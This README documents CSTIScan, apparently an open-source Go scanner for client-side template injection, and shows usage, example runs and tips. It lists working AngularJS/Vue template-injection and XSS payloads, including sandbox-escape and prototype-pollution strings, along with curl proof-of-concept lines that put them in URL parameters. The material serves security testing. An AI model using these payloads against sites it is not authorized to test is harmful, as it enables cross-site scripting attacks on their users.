<p align="center">
   <img src="bet.png" width="100" height="100">
</p>

# 🕵️‍♂️ CSTIScan: Client-Side Template Injection (SISTEE) Scanner

CSTIScan is a powerful tool designed to identify and exploit potential Client-Side Template Injection (CSTI) vulnerabilities in web applications. CSTI occurs when user input is incorrectly handled and inserted into client-side templates, potentially leading to cross-site scripting (XSS) and other security issues.

## 🚀 Features

- 🔍 Automated scanning of single or multiple URLs
- 🧪 Tests various CSTI payloads
- 📊 Detailed vulnerability reporting
- 🛠️ Proof of Concept (PoC) generation
- 📈 Progress bar for multiple URL scans
- 🎨 Colorized console output

## 📦 Installation

1. Ensure you have Go installed on your system.
2. Clone this repository:

```
git clone https://github.com/queencitycyber/SISTEE
cd SISTEE
go mod init csti.go
go mod tidy
go build .
```


## 🔧 Usage

Public Firing Range: 

* AngularJS: [https://jsfiddle.net/2zs2yv7o/](https://jsfiddle.net/2zs2yv7o/)

* VueJS: [https://vue-client-side-template-injection-example.azu.now.sh/](https://vue-client-side-template-injection-example.azu.now.sh/)


### Help Menu

```
NAME:
   cstiscan - Scan for Client-Side Template Injection vulnerabilities

USAGE:
   cstiscan [global options] command [command options]

COMMANDS:
   help, h  Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --url value, -u value   Single URL to test
   --file value, -f value  File containing URLs to test
   --poc                   Output PoC details (default: false)
   --proof                 Output proof of vulnerable code (default: false)
   --help, -h              show help
```

### Example Run - Provide Proof

```
./csti.go --url https://jsfiddle.net/2zs2yv7o/ --proof
 100% |█████████████| (1/1, 1 it/s)        
URL: https://jsfiddle.net/2zs2yv7o/
Vulnerable: Yes
Details:
Potential CSTI with payload
Proof:
Payload reflection: {{7*7}}
Payload reflection: <%= 7*7 %>
Payload reflection: {{constructor.constructor('alert(1)')()}}
Payload reflection: {{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}
Payload reflection: {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'alert(1)'}}
--------------------------------------------------------------------------------
Results saved to csti_results.json
```

### Example Run - Provide PoC

```
./csti.go --url https://jsfiddle.net/2zs2yv7o/ --poc
 100% |█████████████| (1/1, 1 it/s)        
URL: https://jsfiddle.net/2zs2yv7o/
Vulnerable: Yes
Details:
Potential CSTI with payload
PoC:
curl 'https://jsfiddle.net/2zs2yv7o/?test=%7B%7B7*7%7D%7D'
curl 'https://jsfiddle.net/2zs2yv7o/?test=${7*7}'
curl 'https://jsfiddle.net/2zs2yv7o/?test=<%= 7*7 %>'
curl 'https://jsfiddle.net/2zs2yv7o/?test=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D'
curl 'https://jsfiddle.net/2zs2yv7o/?test=%7B%7BtoString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)%7D%7D'
curl 'https://jsfiddle.net/2zs2yv7o/?test=%7B%7B{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'alert(1)'%7D%7D'
--------------------------------------------------------------------------------
Results saved to csti_results.json
```

### Single URL Scan
```
./cstiscan --url https://example.com
```

### Multiple URL Scan
```
./cstiscan --file urls.txt
```

### Include PoC Commands
```
./cstiscan --url https://example.com --poc
```

### Include Proof of Vulnerable Code
```
./cstiscan --url https://example.com --proof
```

## 🔬 Methodology

### 1. Automated Scanning
The tool performs the following steps:
- Fetches the target URL(s)
- Analyzes the HTML content for potential CSTI vectors
- Tests various CSTI payloads
- Generates a detailed report of findings

### 2. Manual Verification
For each potentially vulnerable URL:
1. Open the URL in a browser
2. Open the browser's developer console
3. Inject test payloads into user input fields or URL parameters
4. Check for unexpected behavior or script execution

### 3. CSTI Payload Testing
The tool tests various payloads, including:

```
{{77}}
${77}
<%= 7*7 %>
{{constructor.constructor('alert(1)')()}}
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}
{{{}[{toString:[].join,length:1,0:'proto'}].assign=[].join;'alert(1)'}}
```

### 4. Identifying Vulnerable Templates
The scanner looks for patterns that might indicate template usage, such as:
- `{{ }}` (Mustache, Handlebars, AngularJS, Vue.js)
- `${ }` (ES6 template literals, some frameworks)
- `<%= %>` (EJS, Underscore.js)

## 📊 Results

- The tool outputs a table with vulnerable URLs, details, and optional PoC commands
- For manual testing, document:
  - The URL tested
  - The payload used
  - The observed behavior (e.g., unexpected script execution, template evaluation)
- Results are saved in JSON format for further analysis

## 💡 Tips & Tricks

1. **URL Parameter Testing**: Try injecting payloads via URL parameters:

```
https://target.com/page?param={{7*7}}
```

2. **Combine with XSS**: CSTI can often lead to XSS, test with alert functions:

```
{{constructor.constructor('alert("CSTI vulnerability")')()}}
```

3. **Check for Different Template Engines**: Different frameworks use different syntax, test various formats:

* `{{ }}` for Mustache, Handlebars, AngularJS, Vue.js
* `${ }` for ES6 template literals
* `<%= %>` for EJS, Underscore.js

4. **Prototype Pollution via CSTI**: Some payloads can lead to prototype pollution:

```
{{{}[{toString:[].join,length:1,0:'proto'}].assign=[].join;'alert(1)'}}
```
